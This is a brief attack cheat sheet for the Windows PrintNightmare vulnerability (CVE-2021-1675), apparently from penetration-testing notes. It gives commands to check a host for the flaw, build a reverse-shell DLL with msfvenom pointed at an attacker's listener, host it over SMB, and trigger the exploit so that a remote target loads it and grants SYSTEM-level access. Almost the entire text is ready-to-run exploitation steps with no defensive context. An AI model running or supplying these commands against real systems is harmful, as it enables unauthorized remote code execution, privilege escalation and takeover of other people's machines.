# PrintNightmare (CVE-2021-1675)

### Check if vulnerable

Print Spooler service running — Most Windows hosts are vulnerable

```bash
rpcdump.py $IP | grep -i spooler
crackmapexec smb $IP -u user -p 'password' -M printnightmare
```

---

### Local Privilege Escalation

Add malicious DLL via Print Spooler — Escalate to SYSTEM

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f dll -o evil.dll
impacket-smbserver share $(pwd) -smb2support
python3 CVE-2021-1675.py domain.local/user:'password'@$IP '\\$LHOST\share\evil.dll'
```

---

### Remote Code Execution

Exploit remotely via Print Spooler

```bash
python3 CVE-2021-1675.py domain.local/user:'password'@$IP '\\$LHOST\share\evil.dll'
# Or from existing shell:
.\SharpPrintNightmare.exe '\\$LHOST\share\evil.dll'
```

---
